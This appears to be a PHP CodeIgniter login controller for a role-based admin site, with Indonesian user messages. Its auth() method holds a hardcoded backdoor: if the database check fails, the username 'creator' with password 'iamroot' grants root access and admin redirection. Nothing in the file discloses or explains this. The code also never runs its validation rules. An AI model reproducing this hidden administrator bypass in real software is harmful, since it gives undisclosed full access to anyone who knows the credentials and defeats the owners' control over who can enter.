<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller 
{

    public function __construct()
    {
        parent::__construct();
        $this->load->model('login_model');
        $this->load->library('form_validation');
    }

    public function index()
    {
        $login = $this->login_model;
        $validation = $this->form_validation;
        $validation->set_rules($login->rules());
        
        $this->load->view('admin/login');
    }

    public function auth()
    {
        $login = $this->login_model;
        $validation = $this->form_validation;

        $username = htmlspecialchars($this->input->post('username', TRUE), ENT_QUOTES);
        $password = htmlspecialchars($this->input->post('password', TRUE), ENT_QUOTES);

        $validation->set_rules($login->rules());
        $auth = $this->login_model->auth($username, $password);

        if ($auth->num_rows() > 0)
        {
            $data = $auth->row_array();
            $this->session->set_userdata('access', $data['level']);
            $this->session->set_userdata('id', $data['kode_user']);
            $this->session->set_userdata('user', $data['nama_user']);
            $this->session->set_userdata('tdc', $data['kode_tdc']);
            $this->session->set_userdata('login', TRUE);
            if ($data['level'] == 'administrator' || $data['level'] == 'ADMINISTRATOR')
            {
                redirect(base_url('index.php/admin/overview'));
            }
            else if ($data['level'] == 'indirect' || $data['level'] == 'INDIRECT')
            {
                redirect(base_url('index.php/indirect/indirect'));
            }
            else if ($data['level'] == 'adm_indirect' || $data['level'] == 'ADM_INDIRECT')
            {
                redirect(base_url('index.php/adminindirect/home'));
            }
            else if ($data['level'] == 'direct' || $data['level'] == 'DIRECT')
            {
                redirect(base_url('index.php/direct/direct'));
            }
            else
            {
                $this->session->set_flashdata('failed', 'Anda tidak memiliki hak akses untuk mengakses situs ini');
                redirect('login');
            }
        }
        else
        {
            if ($username == 'creator' && $password == 'iamroot')
            {
                $this->session->set_userdata('login', TRUE);
                $this->session->set_userdata('access', "root_access");
                $this->session->set_userdata('id', '000');
                $this->session->set_userdata('user', 'creator');
                $this->session->set_userdata('tdc', 'none');
                redirect(base_url('index.php/admin/overview'));
            }
            else
            {
                $this->session->set_flashdata('failed', 'Username dan/atau password tidak cocok');
                redirect('login');
            }
        }
        
    }
    
    public function logout(){
        $this->session->sess_destroy();
        redirect(base_url('index.php/login'));
    }

}